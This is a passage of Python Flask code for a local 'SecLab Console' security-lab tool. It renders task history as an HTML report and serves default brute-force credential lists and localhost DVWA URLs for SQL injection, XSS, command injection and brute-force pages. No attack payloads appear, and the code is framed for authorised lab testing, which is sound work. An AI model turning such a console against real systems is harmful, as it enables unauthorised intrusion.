    """把全部任务记录渲染成一份可离线打开 / 打印的 HTML 报告。"""
    from datetime import datetime
    from html import escape

    items = MANAGER.read_history()
    now = datetime.now()
    total = len(items)
    high = sum(1 for i in items if i.get("severity") in ("critical", "high"))
    rows_sum = sum(int(i.get("rows") or 0) for i in items)
    kinds = {}
    for item in items:
        kinds[item.get("kind", "other")] = kinds.get(item.get("kind", "other"), 0) + 1

    def stamp(value):
        try:
            return datetime.fromtimestamp(float(value)).strftime("%m-%d %H:%M:%S")
        except (TypeError, ValueError, OSError):
            return "-"

    body_rows = []
    for index, item in enumerate(items, 1):
        sev = (item.get("severity") or "info").lower()
        cls = "high" if sev in ("critical", "high") else "mid" if sev == "medium" else "low"
        body_rows.append(
            "<tr>"
            f"<td class='num'>{index}</td>"
            f"<td class='mono time'>{stamp(item.get('started'))}</td>"
            f"<td><span class='kind'>{escape(str(item.get('kind', '')).upper())}</span></td>"
            f"<td class='mono wrap'>{escape(str(item.get('target') or '-'))}</td>"
            f"<td>{escape(str(item.get('summary') or ''))}</td>"
            f"<td><span class='sev {cls}'>{escape(sev.upper())}</span></td>"
            f"<td class='num'>{item.get('duration', '-')}s</td>"
            "</tr>"
        )
    if not body_rows:
        body_rows = ["<tr><td colspan='7' class='empty'>暂无记录</td></tr>"]

    kind_text = " · ".join(f"{k.upper()} {v}" for k, v in sorted(kinds.items())) or "—"
    doc = f"""<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SecLab Console 测试报告 · {now:%Y-%m-%d %H:%M}</title>
<style>
  *{{box-sizing:border-box}}
  body{{margin:0;padding:40px 28px;background:#f6f8fa;color:#1f2933;
        font-family:"Segoe UI","Microsoft YaHei",system-ui,sans-serif;font-size:13px;line-height:1.65}}
  .wrap{{max-width:1080px;margin:0 auto;background:#fff;border:1px solid #e3e8ee;border-radius:12px;
         padding:32px 36px;box-shadow:0 6px 24px rgba(16,42,67,.06)}}
  h1{{margin:0 0 4px;font-size:22px;letter-spacing:.4px}}
  .sub{{color:#61707f;font-size:12px;margin-bottom:24px}}
  .cards{{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:24px}}
  .card{{flex:1 1 150px;border:1px solid #e3e8ee;border-radius:10px;padding:12px 14px;background:#fbfcfd}}
  .card b{{display:block;font-size:20px;color:#0b6bcb}}
  .card span{{color:#61707f;font-size:11px}}
  .meta{{color:#61707f;font-size:11.5px;margin:-8px 0 20px;word-break:break-all}}
  table{{width:100%;border-collapse:collapse;font-size:12px}}
  th{{text-align:left;padding:8px 10px;background:#f1f4f8;color:#42525f;font-weight:600;
      border-bottom:1px solid #e3e8ee;white-space:nowrap}}
  td{{padding:8px 10px;border-bottom:1px solid #eef2f6;vertical-align:top}}
  tr:nth-child(even) td{{background:#fbfcfd}}
  .mono{{font-family:Consolas,"Cascadia Code",monospace;font-size:11.5px}}
  .mono.time{{white-space:nowrap;font-size:11px;color:#51616f}}
  .num{{text-align:right;color:#61707f;white-space:nowrap}}
  .wrap-cell{{word-break:break-all}}
  .kind{{font-family:Consolas,monospace;font-size:11px;background:#eef4fb;color:#0b6bcb;
         padding:1px 6px;border-radius:4px}}
  .sev{{font-size:10.5px;font-weight:700;padding:1px 7px;border-radius:10px}}
  .sev.high{{background:#ffe8e8;color:#c02626}}
  .sev.mid{{background:#fff2d9;color:#9a6a00}}
  .sev.low{{background:#e8f3ea;color:#2b7a45}}
  .empty{{text-align:center;color:#8a97a4;padding:24px}}
  .foot{{margin-top:22px;color:#8a97a4;font-size:11px;border-top:1px solid #eef2f6;padding-top:14px}}
  @media print{{body{{background:#fff;padding:0}} .wrap{{border:0;box-shadow:none}}}}
</style></head><body>
<div class="wrap">
  <h1>SecLab Console 测试报告</h1>
  <div class="sub">生成时间 {now:%Y-%m-%d %H:%M:%S} · 授权靶场验证记录 · 共 {total} 条</div>
  <div class="cards">
    <div class="card"><b>{total}</b><span>累计任务</span></div>
    <div class="card"><b>{high}</b><span>高危 / 严重发现</span></div>
    <div class="card"><b>{rows_sum}</b><span>导出数据行</span></div>
    <div class="card"><b>{len(kinds)}</b><span>覆盖模块</span></div>
  </div>
  <div class="meta">模块分布：{escape(kind_text)}</div>
  <table>
    <thead><tr><th>#</th><th>时间</th><th>模块</th><th>目标</th><th>结论</th><th>等级</th><th>耗时</th></tr></thead>
    <tbody>{''.join(body_rows)}</tbody>
  </table>
  <div class="foot">本报告由 SecLab Console 自动生成，仅用于 DVWA / 自建靶场等授权环境的漏洞验证记录。</div>
</div>
</body></html>"""
    resp = app.response_class(doc, mimetype="text/html")
    resp.headers["Content-Disposition"] = (
        f"attachment; filename=seclab-report-{now:%Y%m%d-%H%M}.html")
    return resp


@app.get("/api/defaults")
def defaults():
    from core.brute import DEFAULT_PASSWORDS, DEFAULT_USERS
    return jsonify({
        "users": DEFAULT_USERS,
        "passwords": DEFAULT_PASSWORDS,
        "dvwa": {
            "sqli": "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit",
            "xss": "http://127.0.0.1/vulnerabilities/xss_r/",
            "cmdi": "http://127.0.0.1/vulnerabilities/exec/",
            "brute": "http://127.0.0.1/vulnerabilities/brute/",
        },
    })


if __name__ == "__main__":
    print("=" * 64)
    print("  SecLab Console  ·  本地授权靶场控制台")
    print("  http://127.0.0.1:8848")
    print("  仅监听本机，请勿用于未授权目标")
    print("=" * 64)
    app.run(host="127.0.0.1", port=8848, debug=False, threaded=True)
